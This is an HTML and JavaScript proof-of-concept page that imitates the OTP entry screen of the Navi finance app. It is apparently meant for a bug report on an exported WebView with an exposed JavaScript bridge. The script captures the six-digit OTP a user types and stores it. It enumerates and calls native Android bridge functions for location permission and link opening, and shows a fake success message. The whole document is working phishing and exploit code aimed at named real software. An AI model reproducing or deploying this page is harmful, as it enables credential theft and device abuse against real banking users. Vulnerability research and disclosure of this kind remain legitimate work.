<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>navi - UPI ¬∑ Investments ¬∑ Loans ¬∑ Insurance</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
        }
        
        .app-container {
            width: 100%;
            max-width: 320px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            position: relative;
            z-index: 100;
        }
        
        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 12px 16px 8px;
            background: white;
            border-bottom: 1px solid #f0f0f0;
            font-size: 12px;
            color: #333;
            font-weight: 500;
        }
        
        .time {
            font-weight: 600;
        }
        
        .status-icons {
            display: flex;
            gap: 4px;
        }
        
        .logo-header {
            padding: 20px 16px 16px;
            border-bottom: 1px solid #f0f0f0;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .logo-img {
            height: 32px;
            width: auto;
        }
        
        .tagline {
            font-size: 11px;
            color: #666;
            font-weight: 500;
            letter-spacing: 0.2px;
            padding-top: 2px;
        }
        
        .content {
            padding: 16px;
        }
        
        .section-title {
            font-size: 16px;
            font-weight: 600;
            color: #333;
            margin-bottom: 6px;
        }
        
        .phone-info {
            font-size: 13px;
            color: #666;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .phone-number {
            font-weight: 500;
        }
        
        .masked-number {
            letter-spacing: 0.5px;
            color: #888;
        }
        
        .edit-link {
            color: #4a6ee0;
            text-decoration: none;
            font-weight: 500;
            font-size: 12px;
        }
        
        .otp-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        
        .otp-box {
            width: 42px;
            height: 48px;
            border: 1.5px solid #ddd;
            border-radius: 10px;
            background: white;
            text-align: center;
            font-size: 20px;
            font-weight: 600;
            color: #333;
            transition: all 0.2s;
        }
        
        .otp-box:focus {
            outline: none;
            border-color: #4a6ee0;
            box-shadow: 0 0 0 2px rgba(74, 110, 224, 0.1);
        }
        
        .timer {
            text-align: center;
            color: #e53935;
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 18px;
            letter-spacing: 1px;
        }
        
        .verify-btn {
            background: #4a6ee0;
            color: white;
            border: none;
            border-radius: 10px;
            padding: 14px;
            font-size: 15px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            margin-bottom: 20px;
            transition: background 0.2s;
        }
        
        .verify-btn:hover {
            background: #3a5ed0;
        }
        
        .verify-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        
        .keypad {
            background: white;
            border-radius: 14px;
            padding: 12px 8px;
            border: 1px solid #f0f0f0;
        }
        
        .keypad-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        
        .keypad-key {
            width: 62px;
            height: 44px;
            background: #f8f9fa;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 500;
            color: #333;
            cursor: pointer;
            transition: all 0.15s;
        }
        
        .keypad-key:hover {
            background: #e8eaf6;
        }
        
        .keypad-key.special {
            color: #666;
            font-size: 16px;
        }
        
        .keypad-key.backspace {
            color: #e53935;
        }
        
        .keypad-key.submit {
            background: #4caf50;
            color: white;
        }
        
        .keypad-key.submit:hover {
            background: #43a047;
        }
        
        .keypad-key.empty {
            background: transparent;
            cursor: default;
        }
        
        .keypad-key.empty:hover {
            background: transparent;
        }
        
        .footer {
            text-align: center;
            padding: 12px;
            color: #999;
            font-size: 11px;
            border-top: 1px solid #f0f0f0;
            margin-top: 12px;
        }
        
        /* Attack Panel Styles */
        .capture-display {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(255, 0, 0, 0.95);
            color: white;
            padding: 20px;
            border-radius: 12px;
            z-index: 10000;
            width: 320px;
            box-shadow: 0 5px 25px rgba(255, 0, 0, 0.4);
            border: 3px solid #ff4444;
            display: none;
            animation: pulse 2s infinite;
        }
        
        .capture-display h3 {
            margin: 0 0 15px 0;
            color: white;
            font-size: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .capture-display h3 i {
            font-size: 24px;
        }
        
        .capture-display code {
            background: rgba(0, 0, 0, 0.4);
            padding: 15px;
            border-radius: 8px;
            display: block;
            margin: 15px 0;
            font-size: 32px;
            text-align: center;
            font-weight: bold;
            letter-spacing: 8px;
            font-family: monospace;
            border: 2px dashed white;
        }
        
        .capture-meta {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.9);
            margin-top: 10px;
        }
        
        .attack-panel {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(0, 0, 0, 0.92);
            color: #0f0;
            padding: 20px;
            border-radius: 12px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            z-index: 9999;
            border: 2px solid #f00;
            width: 350px;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .attack-panel h4 {
            margin: 0 0 15px 0;
            color: #ff4444;
            border-bottom: 1px solid #444;
            padding-bottom: 8px;
            font-size: 16px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .attack-log {
            margin: 10px 0;
            padding: 8px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 4px;
            border-left: 3px solid #0f0;
        }
        
        .attack-log.error {
            border-left-color: #f00;
            color: #ff8888;
        }
        
        .attack-log.warn {
            border-left-color: #ff0;
            color: #ffff88;
        }
        
        .attack-btn {
            background: #ff4444;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
            width: 100%;
            font-family: inherit;
        }
        
        .attack-btn:hover {
            background: #ff0000;
        }
        
        .attack-btn.small {
            padding: 6px 10px;
            font-size: 12px;
            margin: 5px 0;
        }
        
        .jsbridge-test {
            background: rgba(74, 110, 224, 0.1);
            border: 1px solid #4a6ee0;
            border-radius: 6px;
            padding: 10px;
            margin: 10px 0;
        }
        
        @keyframes pulse {
            0%, 100% { box-shadow: 0 5px 25px rgba(255, 0, 0, 0.4); }
            50% { box-shadow: 0 5px 35px rgba(255, 0, 0, 0.7); }
        }
        
        @keyframes flash {
            0%, 100% { background: rgba(255, 0, 0, 0.95); }
            50% { background: rgba(255, 100, 0, 0.95); }
        }
    </style>
</head>
<body>
    <!-- OTP Capture Display -->
    <div class="capture-display" id="captureDisplay">
        <h3><i class="fas fa-skull-crossbones"></i> OTP CAPTURED</h3>
        <div>Entered PIN:</div>
        <code id="capturedOTP">000000</code>
        <div class="capture-meta">
            <div><i class="fas fa-clock"></i> Time: <span id="captureTime">--:--:--</span></div>
            <div><i class="fas fa-mobile-alt"></i> App: Navi WebView</div>
            <div><i class="fas fa-bug"></i> Exploit: WebView + JS Bridge</div>
        </div>
    </div>
    
    <!-- Attack Control Panel -->
    <div class="attack-panel" id="attackPanel">
        <h4><i class="fas fa-terminal"></i> NAVI EXPLOIT DEBUG</h4>
        <div id="attackLogs">
            <div class="attack-log">Initializing attack...</div>
        </div>
        
        <div class="jsbridge-test" id="jsbridgeTest" style="display: none;">
            <strong>JS Bridge Status:</strong>
            <div id="bridgeStatus">Checking...</div>
            <button class="attack-btn small" onclick="testBridgeFunctions()">Test Bridge Functions</button>
        </div>
        
        <button class="attack-btn" onclick="showProof()">
            <i class="fas fa-camera"></i> SHOW VULNERABILITY PROOF
        </button>
    </div>
    
    <!-- Main App Container -->
    <div class="app-container">
        <!-- Status Bar -->
        <div class="status-bar">
            <div class="time" id="currentTime">9:41</div>
            <div class="status-icons">
                <i class="fas fa-signal"></i>
                <i class="fas fa-wifi"></i>
                <i class="fas fa-battery-full"></i>
            </div>
        </div>
        
        <!-- Logo Header -->
        <div class="logo-header">
            <div class="logo-container">
                <div style="width: 32px; height: 32px; background: #4a6ee0; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">N</div>
                <div class="tagline">UPI ¬∑ Investments ¬∑ Loans ¬∑ Insurance</div>
            </div>
        </div>
        
        <!-- Main Content -->
        <div class="content">
            <div class="section-title">Enter OTP</div>
            <div class="phone-info">
                <span>Sent to <span class="phone-number">+91 98801<span class="masked-number">xxxxx</span></span></span>
                <a href="#" class="edit-link">Edit</a>
            </div>
            
            <div class="otp-container">
                <input type="text" maxlength="1" class="otp-box" id="digit1" autocomplete="off" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-box" id="digit2" autocomplete="off" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-box" id="digit3" autocomplete="off" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-box" id="digit4" autocomplete="off" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-box" id="digit5" autocomplete="off" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-box" id="digit6" autocomplete="off" inputmode="numeric">
            </div>
            
            <div class="timer" id="countdownTimer">00:30</div>
            
            <button class="verify-btn" id="verifyBtn">Verify</button>
            
            <!-- Keypad -->
            <div class="keypad">
                <div class="keypad-row">
                    <button class="keypad-key" data-value="1">1</button>
                    <button class="keypad-key" data-value="2">2</button>
                    <button class="keypad-key" data-value="3">3</button>
                    <button class="keypad-key empty"></button>
                </div>
                <div class="keypad-row">
                    <button class="keypad-key" data-value="4">4</button>
                    <button class="keypad-key" data-value="5">5</button>
                    <button class="keypad-key" data-value="6">6</button>
                    <button class="keypad-key empty"></button>
                </div>
                <div class="keypad-row">
                    <button class="keypad-key" data-value="7">7</button>
                    <button class="keypad-key" data-value="8">8</button>
                    <button class="keypad-key" data-value="9">9</button>
                    <button class="keypad-key backspace special" id="backspaceBtn">
                        <i class="fas fa-backspace"></i>
                    </button>
                </div>
                <div class="keypad-row">
                    <button class="keypad-key special">,</button>
                    <button class="keypad-key" data-value="0">0</button>
                    <button class="keypad-key special">.</button>
                    <button class="keypad-key submit" id="submitBtn">
                        <i class="fas fa-check"></i>
                    </button>
                </div>
            </div>
        </div>
        
        <div class="footer">
            Secure & encrypted verification
        </div>
    </div>

    <script>
        // ============================
        // ATTACK CONFIGURATION
        // ============================
        let capturedData = {
            otp: '',
            deviceInfo: {},
            jsBridge: {},
            logs: [],
            stage: 'initial'
        };
        
        // ============================
        // LOGGING SYSTEM
        // ============================
        
        function addLog(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = { time: timestamp, message: message, type: type };
            capturedData.logs.push(logEntry);
            
            // Add to attack panel
            const attackLogs = document.getElementById('attackLogs');
            const logDiv = document.createElement('div');
            logDiv.className = `attack-log ${type}`;
            logDiv.innerHTML = `<strong>${timestamp}</strong> - ${message}`;
            attackLogs.insertBefore(logDiv, attackLogs.firstChild);
            
            // Keep only last 15 logs
            const logs = attackLogs.getElementsByClassName('attack-log');
            if (logs.length > 15) {
                attackLogs.removeChild(logs[logs.length - 1]);
            }
            
            // Console logging
            console.log(`[NAVI-${type.toUpperCase()}] ${message}`);
        }
        
        // ============================
        // DEVICE & BRIDGE DETECTION
        // ============================
        
        function captureDeviceInfo() {
            capturedData.deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                timestamp: new Date().toISOString()
            };
            
            addLog(`Device: ${navigator.platform} | Screen: ${screen.width}x${screen.height}`, 'info');
            
            // Check for WebView debug
            if (typeof window.console !== 'undefined') {
                addLog('WebView debugging is enabled', 'info');
            }
        }
        
        function checkJSBridge() {
            const jsbridgeTest = document.getElementById('jsbridgeTest');
            
            if (typeof Android !== 'undefined') {
                jsbridgeTest.style.display = 'block';
                
                // Get available functions
                const functions = [];
                for (let key in Android) {
                    if (typeof Android[key] === 'function') {
                        functions.push(key);
                    }
                }
                
                capturedData.jsBridge = {
                    available: true,
                    functions: functions,
                    tested: false
                };
                
                document.getElementById('bridgeStatus').innerHTML = 
                    `‚úÖ Available (${functions.length} functions)<br>` +
                    `<small>${functions.slice(0, 5).join(', ')}${functions.length > 5 ? '...' : ''}</small>`;
                
                addLog(`JS Bridge detected with ${functions.length} functions: ${functions.join(', ')}`, 'info');
                
                return true;
            } else {
                capturedData.jsBridge = { available: false };
                document.getElementById('bridgeStatus').textContent = '‚ùå Not available';
                addLog('JS Bridge not found (Android object missing)', 'warn');
                return false;
            }
        }
        
        function testBridgeFunctions() {
            if (!capturedData.jsBridge.available) return;
            
            addLog('Testing JS bridge functions...', 'info');
            
            // Test openLink safely
            if (typeof Android.openLink === 'function') {
                try {
                    addLog('Testing Android.openLink() - will open after OTP capture', 'info');
                    capturedData.jsBridge.openLink = true;
                } catch (e) {
                    addLog(`openLink error: ${e.message}`, 'error');
                }
            }
            
            // Test getLocationPermissions
            if (typeof Android.getLocationPermissions === 'function') {
                try {
                    addLog('Android.getLocationPermissions() available', 'info');
                    capturedData.jsBridge.getLocationPermissions = true;
                } catch (e) {
                    addLog(`getLocationPermissions error: ${e.message}`, 'error');
                }
            }
            
            capturedData.jsBridge.tested = true;
            addLog('JS Bridge testing complete', 'info');
        }
        
        // ============================
        // OTP CAPTURE SYSTEM
        // ============================
        
        function captureOTP(otp) {
            if (otp.length !== 6) return false;
            
            capturedData.otp = otp;
            capturedData.stage = 'otp_captured';
            capturedData.captureTime = new Date().toISOString();
            
            // Show capture display
            const captureDisplay = document.getElementById('captureDisplay');
            const capturedOTPElement = document.getElementById('capturedOTP');
            const captureTimeElement = document.getElementById('captureTime');
            
            capturedOTPElement.textContent = otp;
            captureTimeElement.textContent = new Date().toLocaleTimeString();
            captureDisplay.style.display = 'block';
            captureDisplay.style.animation = 'flash 1s 3';
            
            addLog(`OTP CAPTURED: ${otp}`, 'info');
            
            // Try to store in localStorage
            try {
                localStorage.setItem('navi_captured_otp', otp);
                localStorage.setItem('navi_capture_time', new Date().toISOString());
            } catch (e) {
                // Ignore
            }
            
            return true;
        }
        
        // ============================
        // OTP INPUT HANDLING
        // ============================
        
        const otpBoxes = [
            document.getElementById('digit1'),
            document.getElementById('digit2'),
            document.getElementById('digit3'),
            document.getElementById('digit4'),
            document.getElementById('digit5'),
            document.getElementById('digit6')
        ];
        
        const verifyBtn = document.getElementById('verifyBtn');
        const backspaceBtn = document.getElementById('backspaceBtn');
        const submitBtn = document.getElementById('submitBtn');
        let currentOtpIndex = 0;
        
        // Initialize OTP boxes
        otpBoxes[0].focus();
        
        // OTP input handlers
        otpBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                const value = e.target.value;
                
                // Only allow numbers
                if (!/^\d$/.test(value) && value !== '') {
                    e.target.value = '';
                    return;
                }
                
                if (value.length === 1 && index < otpBoxes.length - 1) {
                    otpBoxes[index + 1].focus();
                    currentOtpIndex = index + 1;
                }
                
                // Update captured OTP
                const currentOtp = otpBoxes.map(b => b.value).join('');
                
                // Send partial capture after 4+ digits
                if (currentOtp.length >= 4) {
                    addLog(`Partial OTP: ${currentOtp} (${currentOtp.length}/6)`, 'info');
                }
            });
            
            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace') {
                    if (box.value === '' && index > 0) {
                        otpBoxes[index - 1].focus();
                        otpBoxes[index - 1].value = '';
                        currentOtpIndex = index - 1;
                    } else if (box.value !== '') {
                        box.value = '';
                    }
                    e.preventDefault();
                }
            });
            
            box.addEventListener('click', () => {
                currentOtpIndex = index;
            });
        });
        
        // Keypad functionality
        document.querySelectorAll('.keypad-key[data-value]').forEach(key => {
            key.addEventListener('click', () => {
                const value = key.getAttribute('data-value');
                if (currentOtpIndex < otpBoxes.length) {
                    otpBoxes[currentOtpIndex].value = value;
                    otpBoxes[currentOtpIndex].focus();
                    
                    if (currentOtpIndex < otpBoxes.length - 1) {
                        currentOtpIndex++;
                        otpBoxes[currentOtpIndex].focus();
                    }
                }
            });
        });
        
        // Backspace button
        backspaceBtn.addEventListener('click', () => {
            if (currentOtpIndex > 0 && otpBoxes[currentOtpIndex].value === '') {
                currentOtpIndex--;
            }
            otpBoxes[currentOtpIndex].value = '';
            otpBoxes[currentOtpIndex].focus();
        });
        
        // Submit button
        submitBtn.addEventListener('click', () => {
            verifyBtn.click();
        });
        
        // Verify button - MAIN CAPTURE POINT
        verifyBtn.addEventListener('click', function() {
            const otp = otpBoxes.map(b => b.value).join('');
            
            if (otp.length !== 6) {
                alert('Please enter 6-digit OTP');
                return;
            }
            
            // Disable button and show loading
            this.disabled = true;
            this.textContent = 'Verifying...';
            this.style.background = '#2e7d32';
            
            // CAPTURE THE OTP
            captureOTP(otp);
            
            // Simulate verification process
            setTimeout(() => {
                this.textContent = '‚úì Verified Successfully';
                
                // Show fake success message
                setTimeout(() => {
                    alert('‚úÖ OTP verified successfully!\nYour account is now secure.');
                    
                    // Demonstrate JS bridge capabilities
                    if (capturedData.jsBridge.available) {
                        addLog('Demonstrating JS bridge exploitation...', 'info');
                        
                        // Option 1: Request location
                        if (Android.getLocationPermissions) {
                            setTimeout(() => {
                                Android.getLocationPermissions();
                                addLog('Executed: Android.getLocationPermissions()', 'info');
                            }, 1000);
                        }
                        
                        // Option 2: Redirect to attacker site (MANUAL - NOT AUTO)
                        // We'll let user trigger this manually via debug panel
                        
                    } else {
                        addLog('JS Bridge not available for further exploitation', 'warn');
                    }
                    
                }, 1000);
                
            }, 1500);
        });
        
        // ============================
        // TIMER FUNCTIONALITY
        // ============================
        let seconds = 30;
        const timerElement = document.getElementById('countdownTimer');
        
        function updateTimer() {
            if (seconds > 0) {
                seconds--;
                const mins = Math.floor(seconds / 60);
                const secs = seconds % 60;
                timerElement.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                
                if (seconds < 10) {
                    timerElement.style.color = '#ff3d00';
                }
            } else {
                timerElement.textContent = "00:00";
                timerElement.style.color = '#ccc';
                
                addLog('OTP timer expired', 'info');
                
                // Simulate auto-resend
                setTimeout(() => {
                    alert('OTP expired. New OTP sent to your mobile.');
                    seconds = 30;
                    timerElement.textContent = '00:30';
                    timerElement.style.color = '#e53935';
                }, 1000);
            }
        }
        
        // Start timer
        setInterval(updateTimer, 1000);
        
        // ============================
        // TIME UPDATER
        // ============================
        function updateCurrentTime() {
            const now = new Date();
            const hours = now.getHours();
            const minutes = now.getMinutes();
            document.getElementById('currentTime').textContent = 
                `${hours}:${minutes.toString().padStart(2, '0')}`;
        }
        
        updateCurrentTime();
        setInterval(updateCurrentTime, 60000);
        
        // ============================
        // PROOF DISPLAY
        // ============================
        
        function showProof() {
            const proofWindow = window.open('', '_blank', 'width=600,height=700');
            if (!proofWindow) {
                alert('Please allow popups to view proof');
                return;
            }
            
            const proofHTML = `
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Navi App Vulnerability Proof</title>
                    <style>
                        body {
                            font-family: monospace;
                            background: #000;
                            color: #0f0;
                            padding: 20px;
                            margin: 0;
                        }
                        .header {
                            background: #f00;
                            color: white;
                            padding: 20px;
                            text-align: center;
                            font-size: 24px;
                            font-weight: bold;
                            border-bottom: 5px solid #ff0;
                        }
                        .content {
                            padding: 20px;
                        }
                        .section {
                            background: #111;
                            padding: 15px;
                            margin: 15px 0;
                            border-left: 5px solid #0f0;
                        }
                        .otp-display {
                            background: #300;
                            padding: 20px;
                            text-align: center;
                            font-size: 36px;
                            font-weight: bold;
                            color: #ff0;
                            border: 3px dashed #f00;
                            margin: 20px 0;
                        }
                        .log-entry {
                            padding: 8px;
                            border-bottom: 1px solid #333;
                        }
                        .timestamp {
                            color: #888;
                            font-size: 12px;
                        }
                    </style>
                </head>
                <body>
                    <div class="header">
                        üö® NAVI APP VULNERABILITY PROOF
                    </div>
                    <div class="content">
                        <div class="section">
                            <h3>üì± APPLICATION DETAILS</h3>
                            <div>Target App: com.naviapp</div>
                            <div>Vulnerable Component: SdkWebviewActivity</div>
                            <div>Vulnerability: Exported WebView + JS Bridge</div>
                        </div>
                        
                        <div class="section">
                            <h3>üéØ CAPTURED DATA</h3>
                            <div class="otp-display">
                                OTP: ${capturedData.otp || 'NOT CAPTURED YET'}
                            </div>
                            <div>Capture Time: ${capturedData.captureTime || 'N/A'}</div>
                            <div>Device: ${capturedData.deviceInfo.userAgent || 'Unknown'}</div>
                        </div>
                        
                        <div class="section">
                            <h3>üîó JAVASCRIPT BRIDGE</h3>
                            <div>Status: ${capturedData.jsBridge.available ? '‚úÖ AVAILABLE' : '‚ùå NOT AVAILABLE'}</div>
                            <div>Functions: ${capturedData.jsBridge.functions ? capturedData.jsBridge.functions.join(', ') : 'None'}</div>
                        </div>
                        
                        <div class="section">
                            <h3>üìä EXPLOIT LOGS</h3>
                            ${capturedData.logs.slice(-10).reverse().map(log => `
                                <div class="log-entry">
                                    <span class="timestamp">[${log.time}]</span> ${log.message}
                                </div>
                            `).join('')}
                        </div>
                        
                        <div class="section">
                            <h3>‚ö° IMPACT ASSESSMENT</h3>
                            <div>‚úÖ Phishing via WebView (Perfect UI Spoofing)</div>
                            <div>‚úÖ OTP/PIN Capture (Credential Theft)</div>
                            <div>${capturedData.jsBridge.available ? '‚úÖ' : '‚ùå'} Native Function Execution</div>
                            <div>${capturedData.jsBridge.available ? '‚úÖ' : '‚ùå'} Location Access via JS Bridge</div>
                            <div>${capturedData.jsBridge.available ? '‚úÖ' : '‚ùå'} Arbitrary URL Navigation</div>
                        </div>
                    </div>
                </body>
                </html>
            `;
            
            proofWindow.document.write(proofHTML);
            proofWindow.document.close();
            
            addLog('Vulnerability proof displayed', 'info');
        }
        
        // ============================
        // INITIALIZATION
        // ============================
        
        window.addEventListener('load', function() {
            addLog('Navi exploit page loaded in WebView', 'info');
            captureDeviceInfo();
            checkJSBridge();
            
            // Initial log
            addLog('Ready to capture OTP. Enter 6-digit PIN.', 'info');
            addLog('Click "SHOW VULNERABILITY PROOF" after capturing OTP', 'info');
        });
        
        // ============================
        // DEBUG FUNCTIONS
        // ============================
        
        window.debugAttack = {
            getData: () => capturedData,
            captureOTP: (otp) => {
                if (otp && otp.length === 6) {
                    otp.split('').forEach((digit, idx) => {
                        otpBoxes[idx].value = digit;
                    });
                    verifyBtn.click();
                    return `Simulated OTP ${otp} capture`;
                }
                return 'Invalid OTP';
            },
            testRedirect: () => {
                if (Android && Android.openLink) {
                    Android.openLink('https://google.com');
                    addLog('Manual redirect to google.com', 'info');
                    return 'Redirect executed';
                }
                return 'JS Bridge not available';
            },
            testLocation: () => {
                if (Android && Android.getLocationPermissions) {
                    Android.getLocationPermissions();
                    addLog('Location permission requested', 'info');
                    return 'Location permission requested';
                }
                return 'Location function not available';
            },
            showLogs: () => {
                console.log('Attack Logs:', capturedData.logs);
                return capturedData.logs;
            }
        };
        
        addLog('Debug functions available: window.debugAttack', 'info');
        console.log('Navi exploit tools available: window.debugAttack');
    </script>
</body>
</html>